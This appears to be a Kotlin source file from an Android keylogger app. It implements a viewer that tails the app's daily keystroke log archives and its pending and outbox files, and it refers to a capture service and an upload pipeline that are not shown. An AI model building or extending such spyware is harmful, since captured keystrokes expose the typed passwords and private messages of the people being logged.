package com.bshu2.androidkeylogger.data

import android.content.Context
import com.bshu2.androidkeylogger.UploadPipeline
import java.io.File
import java.io.RandomAccessFile

/** Bounded FIFO of log lines; the oldest line is dropped past [capacity]. */
class LineRing(private val capacity: Int) {
    private val lines = ArrayDeque<String>(capacity)

    fun add(newLines: List<String>) {
        for (line in newLines) {
            if (line.isEmpty()) continue
            if (lines.size == capacity) lines.removeFirst()
            lines.addLast(line)
        }
    }

    fun snapshot(): List<String> = lines.toList()

    fun clear() = lines.clear()
}

/**
 * Read-only view over the files the capture service already writes. Uploads
 * are unaffected: this only tails the newest daily archive for display.
 */
object LogRepository {
    private val ARCHIVE = Regex("^keylog_(\\d{8})\\.txt$")

    fun newestArchive(context: Context): File? {
        val dir = UploadPipeline.logDir(context)
        return dir.listFiles()
            ?.filter { it.isFile && ARCHIVE.matches(it.name) }
            ?.maxByOrNull { it.name }
    }

    fun pending(context: Context): File =
        File(UploadPipeline.logDir(context), UploadPipeline.PENDING_FILE)

    fun newestOutbox(context: Context): File? {
        val dir = UploadPipeline.logDir(context)
        return File(dir, UploadPipeline.OUTBOX_DIR)
            .listFiles()
            ?.filter { it.isFile }
            ?.maxByOrNull { it.lastModified() }
    }

    /** Last [maxLines] lines, reading at most [maxBytes] from the tail. */
    fun tailLines(file: File, maxLines: Int, maxBytes: Int = 256 * 1024): List<String> {
        if (!file.isFile || file.length() == 0L) return emptyList()
        val start = (file.length() - maxBytes).coerceAtLeast(0L)
        return RandomAccessFile(file, "r").use { raf ->
            raf.seek(start)
            val bytes = ByteArray((file.length() - start).toInt())
            val read = raf.read(bytes)
            if (read <= 0) return emptyList()
            val text = String(bytes, 0, read, Charsets.UTF_8)
            text.split('\n')
                .filter { it.isNotBlank() }
                .takeLast(maxLines)
        }
    }

    /**
     * Reads complete lines from [offset], returning them with the new offset.
     * A trailing partial line is left unconsumed so a concurrent write cannot
     * split a record in half. A shrunken file is re-read from zero.
     */
    fun readFrom(file: File, offset: Long): Pair<List<String>, Long> {
        if (!file.isFile) return emptyList<String>() to 0L
        val length = file.length()
        val start = if (length < offset) 0L else offset
        if (start >= length) return emptyList<String>() to start
        return RandomAccessFile(file, "r").use { raf ->
            raf.seek(start)
            val size = (length - start).toInt().coerceAtMost(1 shl 20)
            val bytes = ByteArray(size)
            val read = raf.read(bytes)
            if (read <= 0) return emptyList<String>() to start
            val lastNewline = (read - 1 downTo 0).firstOrNull { bytes[it] == '\n'.code.toByte() }
                ?: return emptyList<String>() to start
            val consumed = lastNewline + 1
            val text = String(bytes, 0, consumed, Charsets.UTF_8)
            val lines = text.split('\n').filter { it.isNotEmpty() }
            lines to (start + consumed)
        }
    }
}

/**
 * Stateful tailer for the viewer. Seeds once from the newest archive, then
 * returns new lines on each poll. Handles day rollover, truncation and
 * delete-all without rescanning the directory's contents.
 */
class LogTailer(context: Context, private val maxLines: Int = 1000) {
    private val appContext = context.applicationContext
    private val ring = LineRing(maxLines)
    private var currentPath: String? = null
    private var offset = 0L

    fun seed(): List<String> {
        val file = LogRepository.newestArchive(appContext)
            ?: LogRepository.pending(appContext).takeIf { it.isFile }
            ?: LogRepository.newestOutbox(appContext)
            ?: return ring.snapshot()
        ring.add(LogRepository.tailLines(file, maxLines))
        currentPath = file.absolutePath
        offset = file.length()
        return ring.snapshot()
    }

    fun poll(): List<String> {
        val file = LogRepository.newestArchive(appContext)
            ?: LogRepository.pending(appContext).takeIf { it.isFile }
            ?: LogRepository.newestOutbox(appContext)
            ?: run {
                ring.clear()
                currentPath = null
                offset = 0L
                return ring.snapshot()
            }
        if (file.absolutePath != currentPath) {
            currentPath = file.absolutePath
            offset = 0L
        }
        val (newLines, newOffset) = LogRepository.readFrom(file, offset)
        offset = newOffset
        ring.add(newLines)
        return ring.snapshot()
    }
}
